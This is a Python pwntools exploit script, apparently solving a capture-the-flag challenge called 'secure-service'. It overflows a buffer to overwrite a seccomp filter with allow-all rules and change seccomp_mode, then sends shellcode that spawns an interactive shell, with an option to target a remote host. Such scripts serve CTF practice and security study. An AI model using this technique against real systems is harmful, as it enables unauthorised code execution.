#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('secure-service')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def solve():

    """
    BPF Seccomp: https://learn.dreamhack.io/263#10

    # define  ALLOW_SYSCALL(name) BPF_JUMP(BPF_JMP + BPF_JEQ + BPF_K, __NR_##name, 0, 1), \ 
        BPF_STMT(BPF_RET + BPF_K, SECCOMP_RET_ALLOW) 

    We can overflow into prog and seccomp_mode

    Filter length is 3

    """

    offset1 = 0x80
    offset2 = 0x68 

    payload =  b"A" * offset1 + p64(0x7fff000000000006) * 3     # for seccomp filter
    payload += b"B" * offset2 + p64(0x2)                        # for seccomp_mode

    io.sendlineafter(b"?", b"bof")
    io.sendlineafter(b":", payload)

    sc = asm(shellcraft.sh())
    io.sendlineafter(b"?", b"shellcode")
    io.sendlineafter(b":", sc)


    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

